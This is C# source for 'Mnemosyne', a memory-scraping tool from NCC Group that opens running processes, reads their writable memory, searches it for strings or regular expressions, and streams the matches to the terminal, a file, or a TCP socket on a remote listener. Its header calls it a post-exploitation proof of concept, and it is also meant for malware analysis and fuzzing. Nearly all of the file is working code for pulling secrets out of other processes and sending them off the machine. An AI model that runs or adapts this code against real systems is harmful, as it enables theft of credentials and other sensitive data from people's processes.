// Mnemosyne - A Memory Scraper
//
// Written by Matt Lewis, NCC Group 2017
// Synopsis - scans a process memory space for a search string (unicode and ascii)
// then if found, spits these out either to stdout, a file or a socket to a remote listener
//
// Useful for memory scraping a process, a post-exploitation POC, an analysis mechanism for malware  or 
// an instrumentation tool to be used during fuzzing
//
// Code adapted from http://www.codeproject.com/Articles/716227/Csharp-How-to-Scan-a-Process-Memory
// Original code licensed under CPOL: http://www.codeproject.com/info/cpol10.aspx

using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Mnemosyne
{
    // container for command-line arguments with basic validator
    class CliArgs
    {
        public int pid = -1;
        public bool proc_hop = false;
        public String ipaddr = "";
        public String filename = "";
        public int portnum = -1;
        public int delay = -1;
        public string searchterm = "";
        public string mode = "";
        public int prepostfix = -1;
        public bool isRegex = false;

        public void setMode(String value)
        {
            this.mode = value;
        }

        public void setPID(String value)
        {
            if (value == "-proc-hop")
            {
                this.proc_hop = true;
                this.pid = 0;
            }
            else {
                int.TryParse(value, out this.pid);
            }
        }

        public void setIPaddr(String value)
        {
            this.ipaddr = value.ToString();
        }

        public void setFilename(String value)
        {
            this.filename = value.ToString();
        }

        public void setPortnum(String value)
        {
            int.TryParse(value, out this.portnum);
        }

        public void setDelay(String value)
        {
            int.TryParse(value, out this.delay);
        }

        public void setPrePostFix(String value)
        {
            int.TryParse(value, out this.prepostfix);
        }

        // get the search term (might be a string separated by spaces on the command line)
        public void setSearchTerm(string[] args, int offset)
        {
            for (int i = offset; i < args.Length; i++)
            {
                if (i != args.Length - 1)
                {
                    this.searchterm += args[i] + " ";
                }
                else
                {
                    this.searchterm += args[i];
                }
            }
            // check if string is a regex
            if (searchterm.StartsWith("~R"))
            {
                isRegex = true;
                //remove our regex identifier "~R" from the start of the string
                this.searchterm = this.searchterm.Remove(0, 2);
            }
        }

        // validate the args
        public bool isValid()
        {
            if (this.mode.Equals("stdio"))
            {
                if (this.pid == -1 || this.delay == -1 || this.prepostfix == -1 || this.searchterm.Equals(""))
                {
                    return false;
                }
                else {
                    return true;
                }
            }
            if (this.mode.Equals("file"))
            {
                if (this.pid == -1 || this.delay == -1 || this.prepostfix == -1 || this.searchterm.Equals("") || this.filename.Equals(""))
                {
                    return false;
                }
                else {
                    return true;
                }
            }
            if (this.mode.Equals("socket"))
            {
                if (this.pid == -1 || this.delay == -1 || this.prepostfix == -1 || this.searchterm.Equals("") || this.ipaddr.Equals("") || this.portnum == -1)
                {
                    return false;
                }
                else
                {
                    try
                    {
                        IPAddress.Parse(this.ipaddr);
                    }
                    catch (Exception)
                    {
                        Console.WriteLine("Error with chosen IP address. Make sure it's a valid IP (not hostname).");
                        return false;
                    }
                    return true;
                }
            }

            return false;
        }

    }

    // main program class
    class ProgObj
    {
        // REQUIRED CONSTS

        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int MEM_COMMIT = 0x00001000;
        const int PAGE_READWRITE = 0x04;
        const int PROCESS_WM_READ = 0x0010;

        // REQUIRED METHODS

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        // REQUIRED STRUCTS

        public struct MEMORY_BASIC_INFORMATION
        {
            public int BaseAddress;
            public int AllocationBase;
            public int AllocationProtect;
            public int RegionSize;
            public int State;
            public int Protect;
            public int lType;
        }

        public struct SYSTEM_INFO
        {
            public ushort processorArchitecture;
            ushort reserved;
            public uint pageSize;
            public IntPtr minimumApplicationAddress;
            public IntPtr maximumApplicationAddress;
            public IntPtr activeProcessorMask;
            public uint numberOfProcessors;
            public uint processorType;
            public uint allocationGranularity;
            public ushort processorLevel;
            public ushort processorRevision;
        }

        // tool banner and usage
        public static void usage()
        {
            System.Console.WriteLine(" ___ ___  ____     ___  ___ ___   ___   _____ __ __  ____     ___ ");
            System.Console.WriteLine("|   |   ||    \\   /  _]|   |   | /   \\ / ___/|  |  ||    \\   /  _]");
            System.Console.WriteLine("| _   _ ||  _  | /  [_ | _   _ ||     (   \\_ |  |  ||  _  | /  [_ ");
            System.Console.WriteLine("|  \\_/  ||  |  ||    _]|  \\_/  ||  O  |\\__  ||  ~  ||  |  ||    _]");
            System.Console.WriteLine("|   |   ||  |  ||   [_ |   |   ||     |/  \\ ||___, ||  |  ||   [_ ");
            System.Console.WriteLine("|   |   ||  |  ||     ||   |   ||     |\\    ||     ||  |  ||     |");
            System.Console.WriteLine("|___|___||__|__||_____||___|___| \\___/  \\___||____/ |__|__||_____| v1.0");

            System.Console.WriteLine("---- Written by Matt Lewis, NCC Group 2017 ----\n");

            System.Console.WriteLine("Usage: mnemosyne -run -s <pid>|-proc-hop <Remote IP> <Remote Port> <delay> <width> <search term>");
            System.Console.WriteLine("                 -run -f <pid>|-proc-hop <filename> <delay> <width> <search term>");
            System.Console.WriteLine("                 -run -o <pid>|-proc-hop <delay> <width> <search term>");
            System.Console.WriteLine("                 -proclist\n\n");
            System.Console.WriteLine("Flag Definitions:");
            System.Console.WriteLine("-s\t\twrite output to socket");
            System.Console.WriteLine("-f\t\twrite output to a file");
            System.Console.WriteLine("-o\t\twrite output to terminal");
            System.Console.WriteLine("<pid>\t\tprocess id to scan");
            System.Console.WriteLine("-proc-hop\tdo a one-time scan across all accessible processes");
            System.Console.WriteLine("delay\t\ttime to wait between each memory chunk scan");
            System.Console.WriteLine("width\t\tamount of data (in bytes) to display before and after search term");
            System.Console.WriteLine("search term\tstring to look for in memory (spaces allowed)");
            System.Console.WriteLine("\t\tPrepend search strings with ~R for regular expressions, e.g. ~R\\d{3}-\\d{3}");
        }

        // when search string found this function sends to the appropriate output
        public static void send_write(string mode, string outputstr, int delay, Socket s, System.IO.StreamWriter file)
        {
            if (mode.Equals("socket"))
            {
                byte[] msg = Encoding.ASCII.GetBytes(outputstr);
                int bytesSent = s.Send(msg);
            }
            if (mode.Equals("file"))
            {
                file.WriteLine(outputstr);
            }
            if (mode.Equals("stdio"))
            {
                Console.WriteLine(outputstr);
            }
            // enter sandman
            System.Threading.Thread.Sleep(delay);
        }

        // main method
        static int Main(string[] args)
        {
            if (args.Length == 0)
            {
                usage();
                return 0;
            }

            // display process list
            if (args[0].ToString().Equals("-proclist"))
            {
                System.Console.WriteLine("\nPID\tProcess Name");
                System.Console.WriteLine("---------------------");
                foreach (Process p in Process.GetProcesses())
                {
                    System.Console.WriteLine(p.Id + "\t" + p.ProcessName);
                }
                return 0;
            }

            CliArgs myargs = new CliArgs();

            if (args[0].ToString().Equals("-run") && args.Length >= 5)
            {
                if (args[1].ToString().Equals("-s"))
                {
                    if (args.Length >= 8)
                    {
                        myargs.setMode("socket");
                        myargs.setPID(args[2]);
                        myargs.setIPaddr(args[3]);
                        myargs.setPortnum(args[4]);
                        myargs.setDelay(args[5]);
                        myargs.setPrePostFix(args[6]);
                        myargs.setSearchTerm(args, 7);
                        Console.WriteLine("Starting search for \"{0}\" and sending output to {1}:{2} with delay of {3} and width of {4}", myargs.searchterm, myargs.ipaddr, myargs.portnum.ToString(), myargs.delay.ToString(), myargs.prepostfix.ToString());
                    }
                }
                if (args[1].ToString().Equals("-f"))
                {
                    if (args.Length >= 6)
                    {
                        myargs.setMode("file");
                        myargs.setPID(args[2]);
                        myargs.setFilename(args[3]);
                        myargs.setDelay(args[4]);
                        myargs.setPrePostFix(args[5]);
                        myargs.setSearchTerm(args, 6);
                        Console.WriteLine("Starting search for \"{0}\" and sending output to file {1} with delay of {2} and width of {3}", myargs.searchterm, myargs.filename, myargs.delay.ToString(), myargs.prepostfix.ToString());
                    }
                }
                if (args[1].ToString().Equals("-o"))
                {
                    if (args.Length >= 5)
                    {
                        myargs.setMode("stdio");
                        myargs.setPID(args[2]);
                        myargs.setDelay(args[3]);
                        myargs.setPrePostFix(args[4]);
                        myargs.setSearchTerm(args, 5);
                        Console.WriteLine("Starting search for \"{0}\" and sending output to stdio with delay of {1} and width of {2}", myargs.searchterm, myargs.delay.ToString(), myargs.prepostfix.ToString());
                    }
                }
            }

            // validate arguments, if good then off we go!
            if (myargs.isValid())
            {
                MemScan(myargs);
            }
            else
            {
                Console.WriteLine("Error in arguments. Check and try again.");
                usage();
            }
            return 1;
        }

        public static void MemScan(CliArgs myargs)
        {
            IPAddress ipAddress;
            IPEndPoint remoteIP;
            Socket sender = null;
            System.IO.StreamWriter file = null;

            // writing output to socket
            if (myargs.mode.Equals("socket"))
            {
                try
                {
                    ipAddress = IPAddress.Parse(myargs.ipaddr);
                    remoteIP = new IPEndPoint(ipAddress, myargs.portnum);
                    sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sender.Connect(remoteIP);
                    Console.WriteLine("Socket connected to {0}", sender.RemoteEndPoint.ToString());
                }
                catch (SocketException se)
                {
                    Console.WriteLine("SocketException : {0}", se.ToString());
                }
            }

            // writing output to file
            if (myargs.mode.Equals("file"))
            {
                file = new System.IO.StreamWriter(myargs.filename);
            }

            // get all running processes
            Process[] localAll = Process.GetProcesses();

            // if we're not proc-hopping, just fill the array with the same PID of our target
            // a bit of a fudge but avoids lots of duplicate code otherwise...
            if (!myargs.proc_hop)
            {
                for (int i = 0; i < localAll.Length; i++)
                {
                    localAll[i] = Process.GetProcessById(myargs.pid);
                }
            }

            // we run in an infinite loop, so need to CTRL-C to quit
            while (true)
            {

                foreach (Process process in localAll)
                {
                    // getting minimum & maximum address
                    SYSTEM_INFO sys_info = new SYSTEM_INFO();
                    GetSystemInfo(out sys_info);

                    IntPtr proc_min_address = sys_info.minimumApplicationAddress;
                    IntPtr proc_max_address = sys_info.maximumApplicationAddress;

                    // saving the values as long ints to avoid  lot of casts later
                    long proc_min_address_l = (long)proc_min_address;
                    long proc_max_address_l = (long)proc_max_address;

                    String toSend = "";

                    // opening the process with desired access level
                    IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_WM_READ, false, process.Id);

                    // we don't want to scrape our own process and if we can't get a handle then it's probalby a protected process
                    // so don't try and scan it otherwise Mnemosyne will stall
                    if (process.Id != Process.GetCurrentProcess().Id && processHandle != IntPtr.Zero)
                    {
                        Console.WriteLine("Working on processID {0} : {1}", process.Id, process.ProcessName);

                        // this will store any information we get from VirtualQueryEx()
                        MEMORY_BASIC_INFORMATION mem_basic_info = new MEMORY_BASIC_INFORMATION();

                        // number of bytes read with ReadProcessMemory
                        int bytesRead = 0;

                        // for some efficiencies, pre-compute prepostfix values
                        int postfix = myargs.searchterm.Length + (myargs.prepostfix * 2);

                        while (proc_min_address_l < proc_max_address_l)
                        {
                            // 28 = sizeof(MEMORY_BASIC_INFORMATION)
                            VirtualQueryEx(processHandle, proc_min_address, out mem_basic_info, 28);

                            // if this memory chunk is accessible
                            if (mem_basic_info.Protect == PAGE_READWRITE && mem_basic_info.State == MEM_COMMIT)
                            {
                                byte[] buffer = new byte[mem_basic_info.RegionSize];

                                // read everything in the buffer above
                                ReadProcessMemory((int)processHandle, mem_basic_info.BaseAddress, buffer, mem_basic_info.RegionSize, ref bytesRead);

                                String memStringASCII = Encoding.ASCII.GetString(buffer);
                                String memStringUNICODE = Encoding.Unicode.GetString(buffer);

                                if (myargs.isRegex)
                                {
                                    Regex rgx = new Regex(myargs.searchterm, RegexOptions.IgnoreCase);

                                    // does the regex pattern exist in this chunk in ASCII form?
                                    if (rgx.IsMatch(memStringASCII))
                                    {
                                        int idex = 0;
                                        while (rgx.Match(memStringASCII, idex).Success)
                                        {
                                            idex = rgx.Match(memStringASCII, idex).Index;
                                            try
                                            {
                                                toSend += process.ProcessName + ":" + process.Id + ":0x" + (mem_basic_info.BaseAddress + idex).ToString() + ":A:" + memStringASCII.Substring(idex - myargs.prepostfix, postfix) + "\n";
                                                send_write(myargs.mode, toSend, myargs.delay, sender, file);
                                            }
                                            // if our width is too large then it may exceed a search chunk and be out of bounds
                                            catch (System.ArgumentOutOfRangeException)
                                            {
                                                Console.WriteLine("Out of bounds exception - width too large.");
                                            }

                                            toSend = "";
                                            idex++;
                                        }
                                    }

                                    // does the regex pattern exist in this chunk in UNICODE form?
                                    if (rgx.IsMatch(memStringUNICODE))
                                    {

                                        int idex = 0;
                                        while (rgx.Match(memStringUNICODE, idex).Success)
                                        {
                                            idex = rgx.Match(memStringUNICODE, idex).Index;
                                            try
                                            {
                                                toSend += process.ProcessName + ":" + process.Id + ":0x" + (mem_basic_info.BaseAddress + idex).ToString() + ":U:" + memStringUNICODE.Substring(idex - myargs.prepostfix, postfix) + "\n";
                                                send_write(myargs.mode, toSend, myargs.delay, sender, file);
                                            }
                                            catch (System.ArgumentOutOfRangeException)
                                            {
                                                Console.WriteLine("Out of bounds exception - width too large.");
                                            }

                                            toSend = "";
                                            idex++;
                                        }
                                    }
                                }
                                // does the search terms exist in this chunk in ASCII form?
                                if (memStringASCII.Contains(myargs.searchterm))
                                {
                                    int idex = 0;
                                    while ((idex = memStringASCII.IndexOf(myargs.searchterm, idex)) != -1)
                                    {
                                        try
                                        {
                                            toSend += process.ProcessName + ":" + process.Id + ":0x" + (mem_basic_info.BaseAddress + idex).ToString() + ":A:" + memStringASCII.Substring(idex - myargs.prepostfix, postfix) + "\n";
                                            send_write(myargs.mode, toSend, myargs.delay, sender, file);
                                        }
                                        catch (System.ArgumentOutOfRangeException)
                                        {
                                            Console.WriteLine("Out of bounds exception - width too large.");
                                        }

                                        toSend = "";
                                        idex++;
                                    }

                                }

                                // does the search terms exist in this chunk in UNICODE form?
                                if (memStringUNICODE.Contains(myargs.searchterm))
                                {
                                    int idex = 0;
                                    while ((idex = memStringUNICODE.IndexOf(myargs.searchterm, idex)) != -1)
                                    {
                                        try
                                        {
                                            toSend += process.ProcessName + ":" + process.Id + ":0x" + (mem_basic_info.BaseAddress + idex).ToString() + ":U:" + memStringUNICODE.Substring(idex - myargs.prepostfix, postfix) + "\n";
                                            send_write(myargs.mode, toSend, myargs.delay, sender, file);
                                        }
                                        catch(System.ArgumentOutOfRangeException)
                                        {
                                            Console.WriteLine("Out of bounds exception - width too large.");
                                        }

                                        toSend = "";
                                        idex++;
                                    }

                                }

                            }

                            // truffle shuffle - moving on chunk
                            proc_min_address_l += mem_basic_info.RegionSize;
                            proc_min_address = new IntPtr(proc_min_address_l);

                        }
                    }
                }
            }
            // ask Turing if we'll ever get here...
            sender.Shutdown(SocketShutdown.Both);
            sender.Close();
            if (myargs.mode.Equals("file"))
            {
                file.Close();
            }
        }
    }
}